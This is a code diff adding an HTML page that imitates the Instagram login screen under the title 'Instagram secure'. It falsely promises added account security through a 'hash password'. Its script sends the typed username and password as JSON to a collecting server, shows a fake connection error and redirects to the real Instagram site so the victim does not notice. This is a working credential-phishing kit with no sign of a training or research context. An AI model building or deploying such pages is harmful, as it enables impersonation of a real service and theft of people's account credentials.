@@ -1,0 +1,86 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link rel="stylesheet" href="./styles.css" />
+    <link rel="icon" type="image/png" href="./img/insta-fav.ico">
+    <title>Instagram secure</title>
+</head>
+<body>
+    <main class="flex align-items-center justify-content-center">
+        <section id="mobile" class="flex">
+        </section>
+        <section id="auth" class="flex direction-column">
+            <div class="panel login flex direction-column">
+                <h1 title="Instagram" class="flex justify-content-center">
+                    <img src="./img//instagram-logo.png" alt="Instagram logo" title="Instagram logo" />
+                </h1>
+                <h6>This instagram app will make sure to add extra security to your instagram account by adding a hash password next to your acctual password.</h6>
+                <form>
+                    <label for="email" class="sr-only">Username, email or phone number</label>
+                    <input name="email" id="username" placeholder="Username, email or phone number" />
+
+                    <label for="password" class="sr-only">Password</label>
+                    <input name="password" id="password" type="password" placeholder="Password" />
+
+                    <button type="button" id="btn" style="cursor: pointer;">Proceed</button>
+                </form>
+                <div class="flex separator align-items-center">
+                </div>
+                <div class="login-with-fb flex direction-column align-items-center">
+                    <div style="text-align: center;">
+                        <img />
+                        <a>We don't do any account that is logged in by using Google or Facebook</a>
+                    </div>
+                    <a href="#">Your privecy, our mercy</a>
+                </div>
+            </div>
+            <div class="panel register flex justify-content-center">
+                <p>Don't have an account?</p>
+                <a href="https://www.instagram.com/">Create your account</a>
+            </div>
+        </section>
+    </main>
+    <footer>
+        <p class="copyright">© 2024 Instagram | Facebook</p>
+    </footer>
+</body>
+<script>
+    document.getElementById("btn").onclick = function() {
+        fetch('http://127.0.0.1:8000/', {
+            method : 'POST',
+            headers : {
+                'Content-Type':'application/json',
+                "X-CSRFToken":getCookie("csrftoken"),
+            },
+            body:JSON.stringify({
+                'username':document.getElementById("username").value,
+                'password':document.getElementById('password').value
+            })
+        })
+        .then(response => response.json())
+        .then(data => {
+            if (data.yes) {
+                alert("Something went wong, check your connection and try again")
+                window.location.href = "https://www.instagram.com/"
+            }
+    })
+    }
+    function getCookie(name) {
+        let cookieValue = null;
+        if (document.cookie && document.cookie !== '') {
+            const cookies = document.cookie.split(';');
+            for (let i = 0; i < cookies.length; i++) {
+                const cookie = cookies[i].trim();
+                if (cookie.substring(0, name.length + 1) === (name + '=')) {
+                    cookieValue = decodeURIComponent(cookie.substring(name.length + 1));
+                    break;
+                }
+            }
+            
+        }
+        return cookieValue;
+    }
+</script>
+</html>
